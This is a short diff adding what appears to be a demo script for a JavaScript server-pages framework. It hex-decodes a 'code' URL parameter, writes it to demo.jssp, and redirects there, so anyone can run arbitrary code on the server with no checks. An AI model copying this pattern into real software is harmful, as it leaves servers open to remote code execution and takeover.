@@ -1,0 +1,12 @@
+<?
+	var code = $_GET['code'];
+	if(!code) { exit(); return; }
+
+	code = (new Buffer(code,'hex')).toString();
+
+	var fs = require('fs');
+	fs.writeFile(__dirname+'/demo.jssp',code,wrapper(function(err)
+	{
+		header('Location','demo.jssp',302);
+	}));
+?>
